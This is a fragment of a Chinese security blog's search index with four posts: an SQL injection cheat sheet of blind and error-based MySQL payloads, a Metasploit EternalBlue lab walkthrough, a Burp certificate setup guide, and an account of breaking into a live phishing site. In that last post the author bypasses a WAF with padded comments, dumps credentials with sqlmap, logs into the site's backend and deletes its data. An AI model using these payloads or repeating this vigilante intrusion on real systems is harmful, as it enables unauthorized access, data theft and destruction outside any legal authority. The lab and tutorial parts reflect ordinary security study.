<h5 id="猜第一个数据的第一个字符-1"><a href="#猜第一个数据的第一个字符-1" class="headerlink" title="猜第一个数据的第一个字符"></a>猜第一个数据的第一个字符</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select username <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">68</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br><span class="line">如果要猜第一个数据的第二个字符就把substr(*,<span class="number">2</span>,<span class="number">1</span>)替换</span><br><span class="line">如果要猜第二个数据的第一个字符就替换limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h2><p>MySQL报错注入通过构造payload让信息通过错误提示回显出来，主要应用与查询不回现内容，会打印错误信息；Update、insert等语句，会打印错误的信息。</p>
<h3 id="报错注入所用函数"><a href="#报错注入所用函数" class="headerlink" title="报错注入所用函数"></a>报错注入所用函数</h3><p>需用到四个函数和一个group by语句：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">group by ...	---&gt;分组语句 <span class="comment">//将查询的结果分类汇总</span></span><br><span class="line"><span class="function"><span class="title">rand</span><span class="params">()</span></span>	---&gt;随机数生成函数</span><br><span class="line"><span class="function"><span class="title">floor</span><span class="params">()</span></span>	---&gt;取整函数 <span class="comment">//用来对生成的随机数取整</span></span><br><span class="line"><span class="function"><span class="title">concat</span><span class="params">()</span></span>	---&gt;连接字符串</span><br><span class="line"><span class="function"><span class="title">count</span><span class="params">()</span></span>	---&gt;统计函数 <span class="comment">//结合group by语句统计分组后的数据</span></span><br></pre></td></tr></table></figure>
<h3 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h3><pre><code>执行查询操作时，子查询先开始，所以SELECT database()先执行，然后查询到当前数据库名称”security“，并将其传给concat函数，concat函数在对字符进行连接，
然后是rand()函数，其作用是生成一个大于0小于1的随机浮点数
floor()函数的作用是对传入的参数取整，这里将rand()生成的随机数做处理进行取整，由于rand()生成的值取整结果只能为0，所以我们这里做一点处理，使其生成一个大于0小于2的随机值，并对其取整
加上group by语句对返回的数据进行分组处理
from前的as a，是为concat((SELECT database()), floor(rand()*2))这一串取了个别名，后面使用group by分组时就不用打那么长一串了，直接使用别名就行。
在sqli-labs第五关这样网页无回显的环境下，我们是看不到任何的信息的，所以接下来才是正题，我们要利用count函数和上面的操作构成mysql内部错误，然后通过报错的提示获得我们想要的信息。
(上面的database()函数在实际注入中也可以换成其他的，如version()，具体看你想要通过报错获得的信息)
这里增加一个聚合函数count，构造的语句如下：
mysql&gt; SELECT count(*),concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a;
这里利用count(*)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来：
这里我使用的是information_schema中的schemata表，因为我的数据库有7个，生成的随机结果中0和1有一定比例，不容易出现全是0或者全是1的情况，实际情况下推荐使用information_schema中的tables或者columns两个表，里面的数据条目较多，容易生成较多的随机值。
例如：
mysql&gt; SELECT count(*), concat((SELECT database()), floor(rand()*2))as a from information_schema.tables group by a;</code></pre><h3 id="报错注入过程"><a href="#报错注入过程" class="headerlink" title="报错注入过程"></a>报错注入过程</h3><h4 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat((<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line">查第二个表就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'user'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line">查第二个列就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),floor(rand(0)<span class="number">*2</span>)) as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a --+</span><br><span class="line">查第二个数据就替换limit 1,1</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ms17-010永恒之蓝复现</title>
    <url>/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="ms17-010永恒之蓝复现"><a href="#ms17-010永恒之蓝复现" class="headerlink" title="ms17-010永恒之蓝复现"></a>ms17-010永恒之蓝复现</h1><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
<a id="more"></a>
<p>现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化。</p>
<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>攻击机系统：Kali-Linux<br>攻击机IP：192.168.75.52<br>靶机系统：win7<br>靶机IP：192.168.75.142</p>
<h3 id="查看靶机系统及端口"><a href="#查看靶机系统及端口" class="headerlink" title="查看靶机系统及端口"></a>查看靶机系统及端口</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -O <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/nmapsaomiao.png" class="" title="This is an nmapsaomiao image">
<h3 id="打开msf"><a href="#打开msf" class="headerlink" title="打开msf"></a>打开msf</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
<h3 id="搜索相关的漏洞插件"><a href="#搜索相关的漏洞插件" class="headerlink" title="搜索相关的漏洞插件"></a>搜索相关的漏洞插件</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command</span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
<p>Auxiliarity（辅助模块）<br>Expoit（漏洞利用模块）</p>
<h3 id="使用辅助验证插件测试"><a href="#使用辅助验证插件测试" class="headerlink" title="使用辅助验证插件测试"></a>使用辅助验证插件测试</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS                                                                       yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">1</span>                                                               yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
<p>这里的<code>show options</code>是显示这个插件相关的一些参数，在<code>Required</code>这一栏下面是<code>yes</code>的表示必填参数，这里面还剩<code>RHOSTS</code>这个参数没有填写即目标网段。下面设置一个目标网段，准备进行扫描测试：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<p>设置扫描线程，插件默认是1，这里设置为10：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> threads <span class="comment">10</span></span><br><span class="line">threads <span class="comment">=&gt; 10</span></span><br></pre></td></tr></table></figure>
<p>可以执行<code>show options</code>查看自己刚刚填写的参数信息：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS       <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>                                                  yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">10</span>                                                              yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
<p> 执行<br> <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"> msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Host <span class="keyword">is</span> likely VULNERABLE to MS17<span class="number">-010</span>! - Windows <span class="number">7</span> Home Basic <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span>-bit)</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><br>主机可能易受MS17-010攻击!Windows 7家庭基础7601服务包1 x64位(64位)</p>
<h3 id="使用exploit模块来进行攻击"><a href="#使用exploit模块来进行攻击" class="headerlink" title="使用exploit模块来进行攻击"></a>使用exploit模块来进行攻击</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner<span class="regexp">/smb/</span>smb_ms17_010) &gt; use exploit<span class="regexp">/windows/</span>smb<span class="regexp">/ms17_010_eternalblue</span></span><br></pre></td></tr></table></figure>
<p>设置靶机ip</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<p>攻击</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">msf5 exploit(<span class="name">windows/smb/ms17_010_eternalblue</span>) &gt; exploit</span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/ip.png" class="" title="This is an ip image">
<p>完成！</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>手机添加burp证书</title>
    <url>/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<h1 id="手机添加burp证书"><a href="#手机添加burp证书" class="headerlink" title="手机添加burp证书"></a>手机添加burp证书</h1><p>手机使用逍遥模拟器<br>电脑windows10</p>
<a id="more"></a>
<h2 id="配置收集代理ip"><a href="#配置收集代理ip" class="headerlink" title="配置收集代理ip"></a>配置收集代理ip</h2><p>查看本机ip</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-14.png" class="" title="This is an image-14 image">
<p>进入手机设置修改代理</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-13.png" class="" title="This is an image-13 image">
<h2 id="配置burp监听代理"><a href="#配置burp监听代理" class="headerlink" title="配置burp监听代理"></a>配置burp监听代理</h2><p>添加监听代理</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-15.png" class="" title="This is an image-15 image">
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-16.png" class="" title="This is an image-16 image">
<h2 id="手机安装CA证书"><a href="#手机安装CA证书" class="headerlink" title="手机安装CA证书"></a>手机安装CA证书</h2><p>打开手机浏览器输入 <a href="http://burp/" target="_blank" rel="noopener">http://burp/</a></p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-19.png" class="" title="This is an image-19 image">
<p>点击 CA Certificate 下载证书<br>在手机中打开文件管理器 在 0/Download下</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-20.png" class="" title="This is an image-20 image">
<p>更改证书后缀名</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-23.png" class="" title="This is an image-23 image">

<p>安装证书</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-25.png" class="" title="This is an image-25 image">
<h2 id="尝试抓包"><a href="#尝试抓包" class="headerlink" title="尝试抓包"></a>尝试抓包</h2><p>打开burp抓包拦截功能</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-26.png" class="" title="This is an image-26 image">
<p>在手机浏览器输入网址</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-27.png" class="" title="This is an image-27 image">
<p>抓包成功</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>burp suite</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透LOL钓鱼网站</title>
    <url>/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h1 id="渗透LOL钓鱼网站"><a href="#渗透LOL钓鱼网站" class="headerlink" title="渗透LOL钓鱼网站"></a>渗透LOL钓鱼网站</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间收到一封邮件<br>emmmm 是一个钓鱼网站</p>
<a id="more"></a>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/1.jpg" class="" title="This is an 1 image">
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/2.png" class="" title="This is an 2 image">
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/3.jpg" class="" title="This is an 3 image">

<h2 id="日他"><a href="#日他" class="headerlink" title="日他"></a>日他</h2><p>然后我去百度了一下 看到了  <a href="https://www.secpulse.com/archives/116392.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116392.html</a><br>爆破后台  <a href="http://www.xxx.com.cn/history/login.php" target="_blank" rel="noopener">http://www.xxx.com.cn/history/login.php</a><br>既然人家都做了信息收集我就不做了<br>输入账号密码  账号admin’ 密码 123456</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/4.png" class="" title="This is an 4 image">
<p>报错，把地址也爆出来了</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/5.png" class="" title="This is an 5 image">
<p>那么，直接用sqlmap跑一下<br>用burp抓包  抓包后 在admin后面加个“*”</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6.png" class="" title="This is an 6 image">
<p>然后，sqlmap 跑注入<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/8.png" class="" title="This is an 8 image">
<p>sqlmap中查库<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
<h3 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/9.png" class="" title="This is an 9 image">
<p>有云锁  想办法bypass<br>发现只要select 查什么的时候 就会拦截</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/10.png" class="" title="This is an 10 image">
<p>去网上看了好多 都失败  当看到最后一个的时候 在 <code>/**/</code>中添加600个字符的时候可以绕过我试了一下</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/11.png" class="" title="This is an 11 image">
<p>绕过了   那么直接在lol.txt内加入     <code>/*(里面有600个字符)*/</code>  （由于我不会写tamper）</p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/13.png" class="" title="This is an 13 image">
<p>(把sqlmap中缓存删除一下)</p>
<h3 id="sqlmap中查库"><a href="#sqlmap中查库" class="headerlink" title="sqlmap中查库"></a>sqlmap中查库</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6666.png" class="" title="This is an 6666 image">
<p>成功绕过</p>
<h3 id="sqlmap查表"><a href="#sqlmap查表" class="headerlink" title="sqlmap查表"></a>sqlmap查表</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx --tables</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/16.png" class="" title="This is an 16 image">
<h3 id="sqlmap查列"><a href="#sqlmap查列" class="headerlink" title="sqlmap查列"></a>sqlmap查列</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx -T xxx --columns</code></p>
<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/18.png" class="" title="This is an 18 image">
<h3 id="sqlmap查数据"><a href="#sqlmap查数据" class="headerlink" title="sqlmap查数据"></a>sqlmap查数据</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/19.png" class="" title="This is an 19 image">
<p>密码MD5解密后 Aaxxxxxxxx</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/20.png" class="" title="This is an 20 image">
<p>后台没有什么太多的功能无法getshell 但是数据很多<br>数据库权限是usage<br>最后删除数据</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
        <tag>SQL注入</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
</search>
